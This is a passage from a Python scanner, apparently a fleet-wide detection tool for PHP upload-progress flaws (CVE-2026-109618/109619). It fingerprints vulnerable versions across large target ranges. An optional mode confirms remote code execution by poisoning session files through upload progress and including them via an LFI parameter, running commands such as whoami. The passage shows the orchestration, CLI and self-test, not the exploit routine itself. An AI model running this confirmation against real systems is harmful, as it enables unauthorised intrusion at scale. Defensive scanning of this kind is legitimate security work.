                    for line in fh:
                        try:
                            keys.add(json.loads(line)["target"])
                        except (json.JSONDecodeError, KeyError, TypeError):
                            continue
            except OSError:
                pass
        return keys

    def add(self, r):
        row = asdict(r)
        with self.lock:
            try:
                self._jsonl.write(json.dumps(row) + "\n")
                self._jsonl.flush()
            except (OSError, TypeError):
                pass
            try:
                self._writer.writerow(row)
                self._csv.flush()
            except (OSError, csv.Error):
                pass
            if r.is_finding:
                try:
                    self._findings.write(self._finding_line(r))
                    self._findings.flush()
                except OSError:
                    pass
            self.count += 1

    @staticmethod
    def _finding_line(r):
        rce = r.confirm_output.splitlines()[0] if (
            r.confirm_status == "ok" and r.confirm_output) else "-"
        status = "RCE" if r.confirm_status == "ok" else r.status.upper()
        return (f"{status:<10} {r.php_version or '-':<10} {rce[:30]:<30} "
                f"{r.target}  {r.detail}\n")

    def finalize(self, meta, want_json):
        with self.lock:
            for fh in (self._jsonl, self._csv, self._findings):
                try:
                    fh.close()
                except OSError:
                    pass
            try:
                os.replace(self._csv_tmp, self.csv_path)
            except OSError as e:
                warn(f"[!] could not finalise CSV: {e}")
            try:
                os.replace(self._find_tmp, self.findings_path)
            except OSError as e:
                warn(f"[!] could not finalise findings: {e}")
        if want_json:
            try:
                tmp = f"{self.json_path}.tmp.{os.getpid()}"
                with open(tmp, "w", encoding="utf-8") as fh:
                    json.dump(meta, fh, indent=2)
                os.replace(tmp, self.json_path)
            except (OSError, TypeError) as e:
                warn(f"[!] could not write JSON: {e}")


# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------
def scan_target(t, args, transport, limiter, host_limiter, fixed_min, dash):
    r = Result(target=t["display"], host=t["host"], port=t["port"], scheme=t["scheme"])
    t0 = time.monotonic()
    try:
        _scan_inner(t, args, transport, limiter, host_limiter, fixed_min, dash, r)
    except (socket.timeout, TimeoutError):
        r.error = "timeout"
    except socket.gaierror as e:
        r.error = f"dns:{e}"
    except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
        r.error = type(e).__name__
    except ssl.SSLError as e:
        r.error = f"tls:{e}"
    except http.client.HTTPException as e:
        r.error = f"http:{e}"
    except OSError as e:
        r.error = f"{type(e).__name__}: {e}"
    except Exception as e:
        r.error = f"{type(e).__name__}: {e}"
        if args.debug:
            emit(f"    !! {t['display']} traceback:\n{traceback.format_exc()}")
    r.elapsed_ms = int((time.monotonic() - t0) * 1000)
    return r


def _scan_inner(t, args, transport, limiter, host_limiter, fixed_min, dash, r):
    host_limiter.acquire(t["host"])
    limiter.acquire()
    try:
        resp = transport.request(t, "GET", t["path"], max_body=args.max_body)
    except ssl.SSLError:
        if args.auto_scheme and t.get("inferred") and t["scheme"] == "https":
            ft = _target("http", t["host"],
                         80 if t["port"] == 443 else t["port"],
                         t["path"], transport.resolve_map, inferred=True)
            ft["host_header"] = t.get("host_header")
            debug(f"    .. TLS failed for {t['display']}, retrying over http")
            limiter.acquire()
            resp = transport.request(ft, "GET", ft["path"], max_body=args.max_body)
            t = ft
            r.target = ft["display"]
            r.scheme = ft["scheme"]
            r.port = ft["port"]
            r.detail = "(http fallback) "
        else:
            raise

    r.http_status = resp.status
    r.final_url = resp.url if resp.redirects else ""
    ver, src = fingerprint(resp)
    status, detail = classify_version(ver, fixed_min)
    r.php_version = ".".join(map(str, ver)) if ver else ""
    r.ver_source = src
    r.status = status
    if ver is None:
        server = resp.headers.get("server", "")
        detail += (f"; Server={server!r}" if server else "")
    r.detail = (r.detail + detail) if r.detail else detail

    if status not in ("affected", "unknown"):
        return

    if args.probe:
        if dash:
            dash.phase(r.target, "probe")
        try:
            p_status, sets = benign_probe(t, transport, limiter)
            r.probe_status = p_status
            r.probe_sets_phpsessid = "yes" if sets else "no"
        except Exception as e:
            r.probe_status = f"err:{type(e).__name__}"

    if args.confirm:
        if dash:
            dash.phase(r.target, "confirm")
        try:
            c_status, c_out, c_sid, strat, d = confirm_rce(
                t, transport, args.confirm_cmd, args.lfi_param, args.confirm_dirs,
                args.confirm_pad_kb, args.confirm_delay, args.confirm_pollers,
                limiter, args.timeout)
            r.confirm_status = c_status
            r.confirm_output = c_out
            r.confirm_strategy = strat
            r.confirm_dir = d
            r.confirm_sid = c_sid if c_status == "ok" else ""
        except Exception as e:
            r.confirm_status = f"err:{type(e).__name__}"
            if args.debug:
                emit(f"    !! confirm {r.target}: {e!r}")


def render_result(r, args):
    if r.error:
        if args.show == "all":
            emit(f"  {col('[err]', 'red')}  {r.target}  {r.error}")
        return
    if r.status == "affected":
        extra = ""
        if r.probe_status:
            extra += f"  probe={r.probe_status} phpsessid={r.probe_sets_phpsessid}"
        tag = col("[AFFECTED]", "yel")
        if r.confirm_status == "ok":
            first = (r.confirm_output.splitlines() or [""])[0]
            tag = col("[RCE]", "grn")
            extra += f"  {col('whoami=' + first, 'grn')}"
        elif r.confirm_status:
            extra += f"  confirm={r.confirm_status}"
        emit(f"{tag} {r.target}  PHP {r.php_version or '?'} ({r.detail}){extra}")
    elif args.show == "all":
        emit(f"  {col('[' + r.status + ']', 'dim'):<24} {r.target}  {r.detail}")


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------
def _simulate_php(data):
    text = data.decode("latin-1")
    out, pos = [], 0
    while True:
        s = text.find("<?php", pos)
        if s < 0:
            out.append(text[pos:])
            break
        out.append(text[pos:s])
        e = text.find("?>", s)
        if e < 0:
            out.append(text[s:])
            break
        code = text[s + 5:e]
        ops = []
        for m in re.finditer(r"echo\s+'([^']*)'", code):
            ops.append((m.start(), m.group(1)))
        for m in re.finditer(r"system\('([^']*)'\)", code):
            ops.append((m.start(), None, m.group(1)))
        for op in sorted(ops, key=lambda x: x[0]):
            if len(op) == 2:
                out.append(op[1])
            else:
                try:
                    out.append(subprocess.run(op[2], shell=True, capture_output=True,
                                              text=True, timeout=10).stdout)
                except Exception:
                    out.append("")
        pos = e + 2
    return "".join(out)


class _TestHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    session_dir = "/tmp"

    def log_message(self, *a):
        pass

    def _sid(self):
        m = re.search(r"PHPSESSID=([^;]+)", self.headers.get("Cookie", ""))
        return m.group(1) if m else None

    def _send(self, code, body, sid=None):
        self.send_response(code)
        self.send_header("X-Powered-By", "PHP/8.4.26")
        self.send_header("Server", "Apache/2.4.62 (Debian)")
        if sid:
            self.send_header("Set-Cookie", f"PHPSESSID={sid}; path=/")
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        q = dict(parse_qsl(urlparse(self.path).query))
        if "file" in q:
            try:
                data = open(q["file"], "rb").read()
            except OSError:
                data = b""
            self._send(200, _simulate_php(data).encode("latin-1"))
        else:
            self._send(200, b"<html>index</html>")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        sid = self._sid() or ("selftest" + os.urandom(6).hex())
        m = re.search(r"boundary=([^;]+)", self.headers.get("Content-Type", ""))
        if m:
            boundary = m.group(1).strip().strip('"').encode()
            fn, has_prog = None, False
            for part in body.split(b"--" + boundary):
                head, _, _ = part.partition(b"\r\n\r\n")
                hs = head.decode("latin-1", "replace")
                if 'name="PHP_SESSION_UPLOAD_PROGRESS"' in hs:
                    has_prog = True
                fm = re.search(r'filename="([^"]*)"', hs)
                if fm:
                    fn = fm.group(1)
            if has_prog and fn is not None:
                content = (f'upload_progress_probe|a:1:{{s:5:"files";a:1:{{i:0;a:1:'
                           f'{{s:9:"file_name";s:{len(fn)}:"{fn}";}}}}}}')
                try:
                    with open(os.path.join(self.session_dir, f"sess_{sid}"),
                              "w", encoding="latin-1") as fh:
                        fh.write(content)
                except OSError:
                    pass
        q = dict(parse_qsl(urlparse(self.path).query))
        if "file" in q:
            try:
                data = open(q["file"], "rb").read()
            except OSError:
                data = b""
            out = _simulate_php(data).encode("latin-1")
        else:
            out = b"posted"
        self._send(200, out, sid=sid)


def _make_cert(tmp):
    crt, key = os.path.join(tmp, "c.pem"), os.path.join(tmp, "k.pem")
    try:
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048",
                        "-keyout", key, "-out", crt, "-days", "2", "-nodes",
                        "-subj", "/CN=127.0.0.1"],
                       check=True, capture_output=True, timeout=30)
        return crt, key
    except (OSError, subprocess.SubprocessError):
        return None, None


def selftest():
    global _DASH
    print(f"[selftest] v{__version__} — starting in-process PHP-ish server(s)...")
    tmp = tempfile.mkdtemp(prefix="upp_selftest_")
    _TestHandler.session_dir = tmp
    ok = True

    servers = []
    try:
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _TestHandler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        servers.append(srv)
        http_port = srv.server_address[1]

        https_port = None
        crt, key = _make_cert(tmp)
        if crt:
            try:
                hsrv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _TestHandler)
                sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                sctx.load_cert_chain(crt, key)
                hsrv.socket = sctx.wrap_socket(hsrv.socket, server_side=True)
                threading.Thread(target=hsrv.serve_forever, daemon=True).start()
                servers.append(hsrv)
                https_port = hsrv.server_address[1]
            except (ssl.SSLError, OSError) as e:
                print(f"[selftest] https server unavailable: {e}")
        else:
            print("[selftest] openssl missing — skipping https case")

        tr = Transport(timeout=5, retries=1, backoff=0.1, max_redirects=3,
                       max_body=65536, verify_tls=False)

        def check(scheme, port, label):
            nonlocal ok
            t = _target(scheme, "127.0.0.1", port, "/")
            try:
                r = tr.request(t, "GET", "/")
                ver, src = fingerprint(r)
                status, _ = classify_version(ver, parse_fixed_min([]))
                print(f"[selftest:{label}] fingerprint {ver} via {src} -> {status}")
                ok &= (ver == (8, 4, 26) and status == "affected")

                p_status, sets = benign_probe(t, tr, TokenBucket(0))
                print(f"[selftest:{label}] probe HTTP {p_status} sets-sid={sets}")
                ok &= (p_status == 200 and sets)

                c_status, out, _sid, strat, _d = confirm_rce(
                    t, tr, ["whoami"], "file", [tmp], 256, 0.01, 2, TokenBucket(0), 5)
                expect = subprocess.run("whoami", shell=True, capture_output=True,
                                        text=True).stdout.strip()
                print(f"[selftest:{label}] confirm {c_status}/{strat} out={out!r}")
                ok &= (c_status == "ok" and out.strip() == expect)
            except Exception as e:
                print(f"[selftest:{label}] EXCEPTION {e!r}")
                traceback.print_exc()
                ok = False

        check("http", http_port, "http")
        if https_port:
            check("https", https_port, "https")

        print("[selftest] PASS" if ok else "[selftest] FAIL")
    finally:
        for s in servers:
            try:
                s.shutdown()
            except Exception:
                pass
        shutil.rmtree(tmp, ignore_errors=True)
        _DASH = None
    return 0 if ok else 1


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
EPILOG = """\
examples:
  %(prog)s --selftest
  %(prog)s --scope hosts.txt --authorized --out run1
  %(prog)s --scope 10.0.0.0/16 --authorized --workers 200 --rate 400
  %(prog)s --scope hosts.txt --authorized --confirm --lfi-path /index.php --probe

scheme rules:
  bare host            -> https://host:443
  host:80              -> http://host:80
  https://host:8443/x  -> used verbatim
  --auto-scheme retries over http if TLS fails on an inferred target
"""


def build_parser():
    ap = argparse.ArgumentParser(
        prog="detect_upload_progress.py",
        description=f"v{__version__} — CVE-2026-109618/109619 fleet scanner "
                    "(detection + optional RCE confirmation).",
        epilog=EPILOG, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    ap.add_argument("--config", default=None, metavar="FILE", help="JSON defaults.")
    ap.add_argument("--selftest", action="store_true", help="Run offline self-test.")

    g = ap.add_argument_group("scope")
    g.add_argument("--scope", help="Targets file (host, URL, CIDR, range, comma lists).")
    g.add_argument("--authorized", action="store_true", help="Assert authorization.")
    g.add_argument("--limit", type=int, default=0, help="Scan only first N targets.")
    g.add_argument("--shuffle", action="store_true")
    g.add_argument("--exclude", default=None, help="Regex of hosts to drop.")
    g.add_argument("--include", default=None, help="Regex of hosts to keep.")
    g.add_argument("--max-hosts", type=int, default=2_000_000)
    g.add_argument("--default-scheme", choices=("http", "https"), default="https")
    g.add_argument("--auto-scheme", action="store_true", default=True,
                   help="Retry over http if TLS fails on an inferred https target.")

    g = ap.add_argument_group("performance")
    g.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=100)
    g.add_argument("--max-inflight", type=int, default=0, help="Queue depth (default 4x).")
    g.add_argument("--rate", type=float, default=200.0, help="Global req/s (0=off).")
    g.add_argument("--per-host-rate", type=float, default=0.0)
    g.add_argument("--jitter", type=float, default=0.0)
    g.add_argument("--keepalive", action="store_true", help="Reuse connections per host.")
    g.add_argument("--fast", action="store_true", help="retries=1 timeout=5 backoff=0.2")

    g = ap.add_argument_group("network")
    g.add_argument("--timeout", type=float, default=8.0)
    g.add_argument("--retries", type=int, default=2)
    g.add_argument("--backoff", type=float, default=0.4)
    g.add_argument("--max-redirects", type=int, default=5)
    g.add_argument("--max-body", type=int, default=32768)
    g.add_argument("--ipv4", action="store_true")
    g.add_argument("--ipv6", action="store_true")
    g.add_argument("--tls-legacy", action="store_true")
    g.add_argument("--verify-tls", action="store_true", help="Validate certs (default off).")
    g.add_argument("--ca-bundle", default=None)
    g.add_argument("--proxy", default=None, help="http://[user:pass@]host:port")
    g.add_argument("--resolve", action="append", default=[], metavar="HOST=IP")
    g.add_argument("--host-header", default=None)
    g.add_argument("--header", action="append", default=[], metavar="K: V")
    g.add_argument("--user-agent", default=UA)

    g = ap.add_argument_group("detection")
    g.add_argument("--fixed-min", action="append", default=[])
    g.add_argument("--probe", action="store_true", help="Benign multipart reachability probe.")

    g = ap.add_argument_group("confirmation")
    g.add_argument("--confirm", action="store_true")
    g.add_argument("--confirm-cmd", action="append", default=None, metavar="CMD")
    g.add_argument("--lfi-path", default=None)
    g.add_argument("--lfi-param", default="file")
    g.add_argument("--confirm-dirs", default=DEFAULT_SESSION_DIRS)
    g.add_argument("--confirm-pad-kb", type=int, default=4096)
    g.add_argument("--confirm-delay", type=float, default=0.03)
    g.add_argument("--confirm-pollers", type=int, default=3)

    g = ap.add_argument_group("output")
    g.add_argument("--out", default="upload_progress_scan")
    g.add_argument("--output-dir", default=None)
    g.add_argument("--show", choices=("affected", "all"), default="affected")
    g.add_argument("--no-dashboard", action="store_true")
    g.add_argument("--progress-interval", type=float, default=0.5)
    g.add_argument("--no-color", action="store_true")
    g.add_argument("--quiet", action="store_true")
    g.add_argument("-v", "--verbose", action="count", default=0)
    g.add_argument("--debug", action="store_true")
    g.add_argument("--log-file", default=None)
    g.add_argument("--dry-run", action="store_true")
    g.add_argument("--resume", action="store_true")
    g.add_argument("--json", choices=("auto", "on", "off"), default="auto")
    g.add_argument("--stop-after", type=float, default=0.0)
    g.add_argument("--fail-on", choices=("none", "affected", "rce"), default="none",
                   help="Exit 1 when a match is found (CI friendly).")
    return ap


def load_config(path):
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if not isinstance(data, dict):
            warn(f"[!] config {path} is not a JSON object")
            return {}
        return data
    except (OSError, json.JSONDecodeError) as e:
        warn(f"[!] cannot load config {path}: {e}")
        return {}


def validate(args):
    problems = []
    if args.concurrency < 1:
        problems.append("--concurrency must be >= 1")
    if args.timeout <= 0:
        problems.append("--timeout must be > 0")
    if args.rate < 0 or args.per_host_rate < 0:
        problems.append("rate values must be >= 0")
    if args.retries < 0:
        problems.append("--retries must be >= 0")
    if args.max_inflight < 0:
        problems.append("--max-inflight must be >= 0")
    if args.ipv4 and args.ipv6:
        problems.append("--ipv4 and --ipv6 are mutually exclusive")
    if args.confirm_pollers < 1:
        problems.append("--confirm-pollers must be >= 1")
    for h in args.header:
        if ":" not in h:
            problems.append(f"--header {h!r} needs 'K: V'")
    if args.proxy:
        try:
            Proxy(args.proxy)
        except ValueError as e:
            problems.append(str(e))
    if args.fast:
        args.retries = min(args.retries, 1)
        args.backoff = min(args.backoff, 0.2)
        args.timeout = min(args.timeout, 5.0)
    if problems:
        for p in problems:
            print(f"[!] {p}", file=sys.stderr)
        sys.exit(2)


def _sigint(_s, _f):
    if not STOP.is_set():
        warn("\n[!] interrupt — draining, writing partial results...")
        STOP.set()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def run(args):
    global VERBOSITY, _DASH, _LOG_FILE, _COLOR

    VERBOSITY = 2 if args.debug else (0 if args.quiet else 1 + args.verbose)
    _COLOR = (not args.no_color) and sys.stdout.isatty()
    if args.log_file:
        try:
            _LOG_FILE = open(args.log_file, "w", encoding="utf-8")
        except OSError as e:
            warn(f"[!] cannot open --log-file: {e}")

    if args.confirm and not args.confirm_cmd:
        args.confirm_cmd = ["whoami"]
    dirs = [d.strip() for d in args.confirm_dirs.split(",") if d.strip()] or ["/tmp"]

    base = args.out
    if args.output_dir:
        try:
            os.makedirs(args.output_dir, exist_ok=True)
        except OSError as e:
            warn(f"[!] cannot create --output-dir: {e}")
        base = os.path.join(args.output_dir, os.path.basename(args.out))

    resolve_map = {}
    for it in args.resolve:
        if "=" in it:
            k, _, v = it.partition("=")
            resolve_map[k.strip()] = v.strip()

    try:
        with open(args.scope, "r", encoding="utf-8", errors="replace") as fh:
            targets = parse_scope(fh.readlines(), args.default_scheme, resolve_map,
                                  args.max_hosts, args.exclude, args.include)
    except OSError as e:
        warn(f"[!] cannot read scope file: {e}")
        return 3
    if not targets:
        warn("[!] no valid targets in scope file.")
        return 3

    for t in targets:
        t["lfi_path"] = args.lfi_path or t["path"]
        if args.host_header:
            t["host_header"] = args.host_header
    if args.shuffle:
        random.shuffle(targets)
    if args.limit:
        targets = targets[:args.limit]

    if args.dry_run:
        for t in targets:
            print(t["display"])
        print(f"\n{len(targets)} target(s)")
        return 0

    family = socket.AF_INET if args.ipv4 else (socket.AF_INET6 if args.ipv6 else 0)
    extra_headers = {}
    for h in args.header:
        k, _, v = h.partition(":")
        extra_headers[k.strip()] = v.strip()

    try:
        proxy = Proxy(args.proxy) if args.proxy else None
    except ValueError as e:
        warn(f"[!] {e}")
        return 2

    try:
        transport = Transport(args.timeout, args.retries, args.backoff, args.max_redirects,
                              args.max_body, args.tls_legacy, family, extra_headers,
                              args.jitter, args.keepalive, resolve_map,
                              args.default_scheme, args.verify_tls, args.ca_bundle,
                              proxy, args.user_agent)
    except (ssl.SSLError, OSError) as e:
        warn(f"[!] transport init failed: {e}")
        return 3

    limiter = TokenBucket(args.rate, jitter=args.jitter)
    host_limiter = HostLimiter(args.per_host_rate, args.jitter)
    fixed_min = parse_fixed_min(args.fixed_min)

    try:
        sink = Sink(base, args.resume)
    except OSError as e:
        warn(f"[!] cannot open output files: {e}")
        return 3
    skip = sink.resume_keys() if args.resume else set()
    todo = [t for t in targets if t["display"] not in skip]

    dash = Dashboard(len(todo), args.progress_interval, tty=not args.no_dashboard)
    _DASH = dash
    dash.start()

    started = datetime.now(timezone.utc)
    mode = "DETECTION + CONFIRM" if args.confirm else "DETECTION ONLY"
    emit(col(f"[*] CVE-2026-109618/109619  v{__version__}  ({mode})", "bold"))
    emit(f"[*] Targets: {len(todo)}/{len(targets)}  workers: {args.concurrency}  "
         f"rate: {args.rate}/s  per-host: {args.per_host_rate or 'off'}"
         + (f"  proxy: {proxy}" if proxy else ""))
    if args.confirm:
        emit(f"[*] Confirm: {' && '.join(args.confirm_cmd)}  LFI: "
             f"{args.lfi_path or '<target path>'}?{args.lfi_param}=  dirs: {','.join(dirs)}")
    emit(f"[*] Started: {started.isoformat()}")

    depth = args.max_inflight or args.concurrency * 4
    work_q = queue.Queue(maxsize=depth)
    res_q = queue.Queue()
    dead = {"n": 0}
    dead_lock = threading.Lock()

    def producer():
        try:
            for t in todo:
                if STOP.is_set():
                    break
                work_q.put(t)
            for _ in range(args.concurrency):
                work_q.put(None)
        except Exception as e:
            warn(f"[!] producer crashed: {e!r}")

    def worker():
        try:
            while not STOP.is_set():
                t = work_q.get()
                if t is None:
                    break
                dash.phase(t["display"], "detect")
                try:
                    r = scan_target(t, args, transport, limiter, host_limiter,
                                    fixed_min, dash)
                except Exception as e:
                    r = Result(target=t["display"], host=t["host"], port=t["port"],
                               scheme=t["scheme"], error=f"worker:{e!r}")
                finally:
                    dash.unphase(t["display"])
                res_q.put(r)
        except Exception as e:
            warn(f"[!] worker crashed: {e!r}")
        finally:
            with dead_lock:
                dead["n"] += 1

    threading.Thread(target=producer, daemon=True, name="producer").start()
    for i in range(args.concurrency):
        threading.Thread(target=worker, daemon=True, name=f"w{i}").start()

    counts = Counter()
    confirm_counts = Counter()
    done = 0
    deadline = started.timestamp() + args.stop_after if args.stop_after else 0.0

    try:
        while True:
            if STOP.is_set():
                break
            try:
                r = res_q.get(timeout=0.25)
            except queue.Empty:
                with dead_lock:
                    if dead["n"] >= args.concurrency and res_q.empty():
                        break
                if deadline and time.time() > deadline:
                    emit("[*] --stop-after reached")
                    STOP.set()
                    break
                dash.plain_tick()
                continue
            try:
                sink.add(r)
            except Exception as e:
                warn(f"[!] sink error: {e!r}")
            key = "error" if r.error else r.status
            counts[key] += 1
            if r.confirm_status:
                cs = "err" if r.confirm_status.startswith("err:") else r.confirm_status
                confirm_counts[cs] += 1
            dash.complete(key, confirmed=(r.confirm_status == "ok"))
            render_result(r, args)
            done += 1
            if deadline and time.time() > deadline:
                emit("[*] --stop-after reached")
                STOP.set()
                break
    finally:
        STOP.set()
        dash.stop()
        try:
            transport.close()
        except Exception:
            pass

    meta = {
        "cve": ["CVE-2026-109618", "CVE-2026-109619"],
        "tool": f"detect_upload_progress.py {__version__}",
        "started_utc": started.isoformat(),
        "finished_utc": datetime.now(timezone.utc).isoformat(),
        "interrupted": STOP.is_set(),
        "scope_file": args.scope,
        "target_count": len(targets),
        "scanned": done,
        "summary": dict(counts),
        "confirm_summary": dict(confirm_counts) if args.confirm else None,
    }
    want_json = args.json == "on" or (args.json == "auto" and len(targets) <= 250_000)
    sink.finalize(meta, want_json)

    print("")
    print(col("[*] Summary:", "bold"))
    for k in ("affected", "unknown", "fixed", "not_affected", "error"):
        print(f"      {k:<12} {counts.get(k, 0)}")
    if args.confirm:
        print("[*] Confirmation:")
        for k in ("ok", "no_exec", "miss", "err"):
            print(f"      {k:<12} {confirm_counts.get(k, 0)}")
        if confirm_counts.get("miss"):
            print("[!] miss: raise --confirm-pad-kb/--confirm-delay, lower "
                  "--concurrency, or widen --confirm-dirs.")
    print("")
    print(f"[*] Wrote {sink.csv_path}, {sink.jsonl_path}, {sink.findings_path}"
          + (f", {sink.json_path}" if want_json else " (json off)"))
    print(col("[!] 'affected' = patch-review required (version-based); "
              "backports can show as affected.", "dim"))

    if args.fail_on == "rce" and confirm_counts.get("ok"):
        return 1
    if args.fail_on == "affected" and counts.get("affected"):
        return 1
    return 130 if STOP.is_set() else 0


def main():
    global _DASH
    threading.excepthook = _thread_excepthook
    parser = build_parser()

    argv = sys.argv[1:]
    cfg_path = None
    for i, a in enumerate(argv):
        if a == "--config" and i + 1 < len(argv):
            cfg_path = argv[i + 1]
        elif a.startswith("--config="):
            cfg_path = a.split("=", 1)[1]
    if cfg_path:
        cfg = load_config(cfg_path)
        if cfg:
            valid = {a.dest for a in parser._actions}
            parser.set_defaults(**{k: v for k, v in cfg.items() if k in valid})

    try:
        args = parser.parse_args(argv)
    except SystemExit as e:
        raise

    if args.selftest:
        try:
            return selftest()
        except Exception:
            traceback.print_exc()
            return 2

    if not args.scope:
        print("[!] --scope is required (or use --selftest)", file=sys.stderr)
        return 2
    if not args.authorized:
        print("\nREFUSING TO RUN. Re-run with --authorized.\n", file=sys.stderr)
        return 2

    try:
        validate(args)
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 2

    try:
        signal.signal(signal.SIGINT, _sigint)
    except (ValueError, OSError):
        pass

    try:
        return run(args)
    except KeyboardInterrupt:
        STOP.set()
        warn("[!] interrupted")
        return 130
    except Exception:
        warn("[!] fatal error:")
        traceback.print_exc()
        return 2
    finally:
        if _LOG_FILE is not None:
            try:
                _LOG_FILE.close()
            except OSError:
                pass


if __name__ == "__main__":
    sys.exit(main())
